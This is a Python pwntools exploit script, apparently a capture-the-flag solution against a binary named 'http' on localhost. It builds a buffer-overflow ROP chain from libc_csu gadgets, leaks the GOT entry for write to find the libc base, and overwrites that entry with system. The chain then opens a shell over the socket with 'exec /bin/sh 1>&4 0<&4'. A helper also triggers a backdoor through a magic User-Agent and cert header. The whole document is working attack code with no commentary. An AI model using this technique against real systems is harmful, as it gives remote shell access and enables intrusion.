from pwn import *

context.log_level = 'debug'
#context.aslr = False

io = remote('localhost', 1807)
#io = process('./pwn500')
e = ELF('./http')
libc = e.libc

def com_gadet(func_ptr, arg1=0, arg2=0, arg3=0):
	addr1 = 0x004015A6
	addr2 = 0x00401590
	payload = ''
	payload += p64(addr1) 
	payload += 'A' * 8       # add     rsp, 8
	payload += p64(0x0)      # rbx = 0
	payload += p64(0x1)      # rbp = 1
	payload += p64(func_ptr) # r12
	payload += p64(arg3)     # r13 = rdx = arg3
	payload += p64(arg2)     # r14 = rsi
	payload += p64(arg1)     # r15d = edi
	payload += p64(addr2)    # call *func_ptr
	payload += 'A'* 8 * 7    
	return payload

def answer(recv_buf, send_buf, newline= True):
	io.recvuntil(recv_buf)
	if newline:
		io.sendline(send_buf)
	else:
		io.send(send_buf)

#gdb.attach(io, "b *0x401F6F")

def backdoor(cmd):
	payload = "User-Agent: 2135GFTS\r\n"
	payload += "cert: %s\r\n" % cmd
	payload += "\r\n"
	io.send(payload)



overflow_func = 0x0401521  
exec_cmd_func = 0x0040102F # exec_cmd(const char *cmd, char *out_buf, int len)
fd_addr = 0x0601CFC

cmd = 'exec /bin/sh 1>&4 0<&4'
payload = '\x00'#+ 'A' * 1000
payload += 'A' *  531
payload += com_gadet(e.got['write'], 4, e.got['write'],8)
payload += com_gadet(e.got['read'], 4, e.bss(0x10), len(cmd))
payload += com_gadet(e.got['read'], 4, e.got['write'], 8)
payload += com_gadet(e.got['write'], e.bss(0x10), e.bss(0x10)+ len(cmd), 0x8000)

payload += p64(overflow_func)
payload += '\r\n\r\n'

io.send(payload)

buf = io.recv(8)
write_addr = u64(buf)

libc.address = write_addr - libc.symbols['write']
#io.send('/bin/sh\x00')
io.send(cmd)
#io.send(p64(exec_cmd_func))
io.send(p64(libc.symbols['system']))
io.interactive()

